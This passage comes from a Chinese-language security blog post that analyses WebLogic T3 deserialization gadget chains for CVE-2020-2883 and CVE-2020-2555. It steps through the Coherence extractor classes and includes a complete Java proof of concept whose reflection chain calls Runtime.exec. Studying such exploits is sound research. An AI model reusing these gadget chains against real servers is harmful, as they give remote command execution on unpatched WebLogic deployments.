<td>ConstantExtractor</td>
<td>ConstantExtractor(Object oValue)：构造方法，主要将参数值赋给属性m_oConstant；<br>extract(Object oTarget)：返回属性m_oConstant值</td>
</tr>
<tr>
<td>ReflectionExtractor</td>
<td>ReflectionExtractor(String sMethod, Object[] aoParam)：调用ReflectionExtractor(String sMethod, Object[] aoParam, int nTarget)，参数值方法名、参数类型等赋值属性；<br>extract(T oTarget)：调用method.invoke(oTarget, this.m_aoParam) 利用反射调用方法</td>
</tr>
<tr>
<td>ChainedExtractor</td>
<td>ChainedExtractor(@JsonbProperty(“extractors”) ValueExtractor[] aExtractor)：构造函数，赋值给属性ValueExtractor[] aExtractor；<br>extract(Object oTarget)：依次调用oTarget = aExtractor[i].extract(oTarget)，即<strong>依次调用</strong>每个ValueExtractor的extract，<strong>而且将上次调用的结果作为参数</strong></td>
</tr>
</tbody></table>
<p>通过了解以上类即涉及方法，我们第一部分也清楚了：通过ChainedExtractor.extract()可以依次调用oTarget = aExtractor[i].extract(oTarget)，因为上次的结果是本次extract()的参数，从而形成了执行链：Runtime.getRuntime().exec(“calc”)。</p>
<p>继续往下，这里很清楚，就是将extractorComparator的m_extractor属性设置为chainedExtractor，相当于extractorComparator.m_extractor=chainedExtractor</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ExtractorComparator extractorComparator = <span class="keyword">new</span> ExtractorComparator&lt;Object&gt;();</span><br><span class="line">      Field m_extractor = extractorComparator.getClass().getDeclaredField(<span class="string">"m_extractor"</span>);</span><br><span class="line">      m_extractor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      m_extractor.set(extractorComparator, chainedExtractor);</span><br></pre></td></tr></table></figure>

<h3 id="第二部分："><a href="#第二部分：" class="headerlink" title="第二部分："></a>第二部分：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line">      priorityQueue.add(<span class="string">"foo"</span>);</span><br><span class="line">      priorityQueue.add(<span class="string">"bar"</span>);</span><br><span class="line"></span><br><span class="line">      Field comparator = priorityQueue.getClass().getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">      comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      comparator.set(priorityQueue, extractorComparator);</span><br></pre></td></tr></table></figure>

<p>这部分很简单，将priorityQueue的comparator设置为extractorComparator。</p>
<h3 id="第三部分：触发命令执行"><a href="#第三部分：触发命令执行" class="headerlink" title="第三部分：触发命令执行"></a>第三部分：触发命令执行</h3><p>ois.readObject()调用priorityQueue.readObject()，我们在这里ois.readObject()和priorityQueue.readObject()打上断点分析下：</p>
<p><img src="/imgs/image-20200805105654502.png" alt="image-20200805105654502"></p>
<p>priorityQueue.readObject()调用heapify()</p>
<p><img src="/imgs/image-20200805111353750.png" alt="image-20200805111353750"></p>
<p>跟进heapify()，调用siftDown(i, (E) queue[i])</p>
<p><img src="/imgs/image-20200805111542794.png" alt="image-20200805111542794"></p>
<p>跟进siftDown()，会去调用siftDownUsingComparator(k, x)</p>
<p><img src="/imgs/image-20200805112401081.png" alt="image-20200805112401081"></p>
<p>跟进siftDownUsingComparator(k, x)，调用comparator.compare(x, (E) c)，这里的comparator就是我们之前第二部分的extractorComparator，那么这里其实就是去调用ExtractorComparator.compare(“bar”,”foo”)</p>
<p><img src="/imgs/image-20200805113829218.png" alt="image-20200805113829218"></p>
<p>ExtractorComparator.compare()调用chainedExtractor.extract()从而完成整个利用链。</p>
<p><img src="/imgs/image-20200805123552569.png" alt="image-20200805123552569"></p>
<p>梳理下反序列化执行命令的整个过程就是：</p>
<p>ois.readObject()调用priorityQueue.readObject()，然后通过PriorityQueue.heapify()-&gt;siftDown()-&gt;siftDownUsingComparator()-&gt;ExtractorComparator.compare()-&gt;ChainedExtractor.extract()，ChainedExtractor.extract()调用命令执行链，从而完成命令执行。</p>
<h2 id="Gadget2分析"><a href="#Gadget2分析" class="headerlink" title="Gadget2分析"></a>Gadget2分析</h2><p>第一部分跟Gadget1一样，这里不再赘述，直接开始分析下面代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// concurrentSkipListMap.comparator = extractorComparator</span></span><br><span class="line">ConcurrentSkipListMap concurrentSkipListMap = <span class="keyword">new</span> ConcurrentSkipListMap&lt;String, String&gt;();</span><br><span class="line">Field comparator = concurrentSkipListMap.getClass().getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">comparator.set(concurrentSkipListMap, extractorComparator);</span><br><span class="line"></span><br><span class="line">ConcurrentNavigableMap subMap = concurrentSkipListMap.subMap(<span class="string">"foo"</span>, <span class="keyword">false</span>, <span class="string">"bar"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// mutations.renamers = subMap</span></span><br><span class="line">Mutations mutations = <span class="keyword">new</span> Mutations();</span><br><span class="line">Field renamers = mutations.getClass().getDeclaredField(<span class="string">"renamers"</span>);</span><br><span class="line">renamers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">renamers.set(mutations, subMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// val.val = mutations</span></span><br><span class="line">BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">valfield.set(val, mutations);</span><br></pre></td></tr></table></figure>



<p>调用ois.readObject()，BadAttributeValueExpException有readObject()，所以会调用val.readObject()</p>
<p>BadAttributeValueExpException.readObject()获取到BadAttributeValueExpException对象这里是val的val属性值，也就是mutations，然后去调用mutations.toString()</p>
<p><img src="/imgs/image-20200805141002717.png" alt="image-20200805141002717"></p>
<p>Mutations.toString()调用了subMap.size()</p>
<p><img src="/imgs/image-20200805141550303.png" alt="image-20200805141550303"></p>
<p>subMap.size()调用subMap.isBeforeEnd(n, cmp)</p>
<p><img src="/imgs/image-20200805142434559.png" alt="image-20200805142434559"></p>
<p>继续看下subMap.isBeforeEnd(n, cmp)，调用cpr()</p>
<p><img src="/imgs/image-20200805144053498.png" alt="image-20200805144053498"></p>
<p>cpr()调用concurrentSkipListMap.comparator的compare()即extractorComparator.compare()</p>
<p><img src="/imgs/image-20200805144240793.png" alt="image-20200805144240793"></p>
<p>然后后面跟Gadget1一样了通过extractorComparator.compare()调用chainedExtractor.extract()从而触发命令执行。</p>
<h2 id="CVE-2020-2555-Gadget分析"><a href="#CVE-2020-2555-Gadget分析" class="headerlink" title="CVE-2020-2555 Gadget分析"></a>CVE-2020-2555 Gadget分析</h2><p>CVE-2020-2883是绕过了CVE-2020-2555的补丁，这里也简单分析下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">gadget:</span><br><span class="line"> 	BadAttributeValueExpException.readObject()</span><br><span class="line"> 		com.tangosol.util.filter.LimitFilter.toString()</span><br><span class="line">               com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">                   com.tangosol.util.extractor.ReflectionExtractor.extract()</span><br><span class="line">                       Method.invoke()</span><br><span class="line">                       ...</span><br><span class="line">                       Runtime.getRuntime.exec()<span class="keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.filter.LimitFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * author:Y4er.com</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * gadget:</span></span><br><span class="line"><span class="comment"> *      BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment"> *          com.tangosol.util.filter.LimitFilter.toString()</span></span><br><span class="line"><span class="comment"> *              com.tangosol.util.extractor.ChainedExtractor.extract()</span></span><br><span class="line"><span class="comment"> *                  com.tangosol.util.extractor.ReflectionExtractor.extract()</span></span><br><span class="line"><span class="comment"> *                      Method.invoke()</span></span><br><span class="line"><span class="comment"> *                      ...</span></span><br><span class="line"><span class="comment"> *                      Runtime.getRuntime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2020_2555</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// Runtime.class.getRuntime()</span></span><br><span class="line">        ReflectionExtractor extractor1 = <span class="keyword">new</span> ReflectionExtractor(</span><br><span class="line">                <span class="string">"getMethod"</span>,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get invoke() to execute exec()</span></span><br><span class="line">        ReflectionExtractor extractor2 = <span class="keyword">new</span> ReflectionExtractor(</span><br><span class="line">                <span class="string">"invoke"</span>,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;</span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// invoke("exec","calc")</span></span><br><span class="line">        ReflectionExtractor extractor3 = <span class="keyword">new</span> ReflectionExtractor(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"calc"</span>&#125;&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        ReflectionExtractor[] extractors = &#123;</span><br><span class="line">                extractor1,</span><br><span class="line">                extractor2,</span><br><span class="line">                extractor3,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedExtractor chainedExtractor = <span class="keyword">new</span> ChainedExtractor(extractors);</span><br><span class="line">        LimitFilter limitFilter = <span class="keyword">new</span> LimitFilter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//m_comparator</span></span><br><span class="line">        Field m_comparator = limitFilter.getClass().getDeclaredField(<span class="string">"m_comparator"</span>);</span><br><span class="line">        m_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_comparator.set(limitFilter, chainedExtractor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//m_oAnchorTop</span></span><br><span class="line">        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(<span class="string">"m_oAnchorTop"</span>);</span><br><span class="line">        m_oAnchorTop.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_oAnchorTop.set(limitFilter, Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// BadAttributeValueExpException toString()</span></span><br><span class="line">        <span class="comment">// This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line">        <span class="comment">// https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70</span></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, limitFilter);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>同样，命令链不再赘述，还是分析不同的地方</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// limitFilter.m_comparator=chainedExtractor</span></span><br><span class="line">      LimitFilter limitFilter = <span class="keyword">new</span> LimitFilter();</span><br><span class="line">      Field m_comparator = limitFilter.getClass().getDeclaredField(<span class="string">"m_comparator"</span>);</span><br><span class="line">      m_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      m_comparator.set(limitFilter, chainedExtractor);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//limitFilter.m_oAnchorTop=Runtime.class</span></span><br><span class="line">      Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(<span class="string">"m_oAnchorTop"</span>);</span><br><span class="line">      m_oAnchorTop.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      m_oAnchorTop.set(limitFilter, Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// badAttributeValueExpException.val=limitFilter</span></span><br><span class="line">      BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">      Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">      field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      field.set(badAttributeValueExpException, limitFilter);</span><br></pre></td></tr></table></figure>

<p>从反序列化入口开始分析：</p>
<p> BadAttributeValueExpException.readObject()-&gt;limitFilter.toString()</p>
<p><img src="/imgs/image-20200805155956061.png" alt="image-20200805155956061"></p>
<p>limitFilter.toString()调用extractor.extract(this.m_oAnchorBottom)，即extractor.extract(Runtime.class)，从而调用ChainedExtractor.extract(Runtime.class)，所以这里可以看出一开始没有构造Runtime.class，是需要这里传入<img src="/imgs/image-20200805160242650.png" alt="image-20200805160242650"></p>
<p>由于CVE-2020-2555在com.tangosol.util.filter.LimitFilter.toString()这里打了补丁，所以CVE-2020-2883是去绕过这个这个补丁或者寻找新的类来触发ChainedExtractor.extract(Runtime.class)</p>
<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>如果我们想通过反序列化来自动触发命令执行，通过上面的分析可以获取一个思路：</p>
<ol>
<li>首先找到<strong>命令执行链</strong>，这个链的形成往往需要以下条件：相关的类都继承了同一个父类；并且这些类的实现了接口的方法，这个方法可以执行我们传入的参数，类的获取是通过类名，方法的执行是通过反射机制，而且需要一个chain类来连接这些方法的执行</li>
<li>然后我们需要去找一个反序列化入口-某个类的readObject()，这个readObject()需要去调用某个方法然后通过直接或间接利用其它类的方法调用去执行chain类的方法</li>
</ol>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://github.com/MagicZer0/Weblogic_CVE-2020-2883_POC" target="_blank" rel="noopener">MagicZer0/Weblogic_CVE-2020-2883_POC</a></p>
<p><a href="https://github.com/Y4er/CVE-2020-14645" target="_blank" rel="noopener">Y4er/CVE-2020-14645</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget1分析"><span class="toc-number">1.</span> <span class="toc-text">Gadget1分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一部分：命令执行链"><span class="toc-number">1.1.</span> <span class="toc-text">第一部分：命令执行链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二部分："><span class="toc-number">1.2.</span> <span class="toc-text">第二部分：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第三部分：触发命令执行"><span class="toc-number">1.3.</span> <span class="toc-text">第三部分：触发命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget2分析"><span class="toc-number">2.</span> <span class="toc-text">Gadget2分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-2555-Gadget分析"><span class="toc-number">3.</span> <span class="toc-text">CVE-2020-2555 Gadget分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思考总结"><span class="toc-number">4.</span> <span class="toc-text">思考总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接："><span class="toc-number">4.1.</span> <span class="toc-text">参考链接：</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&text=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&title=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&is_video=false&description=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555&body=Check out this article: https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&title=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&title=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&title=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&title=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&name=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&t=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2021
    R17a
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?05441306932d71b1dba39f817847ce3e";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->


</body>
</html>
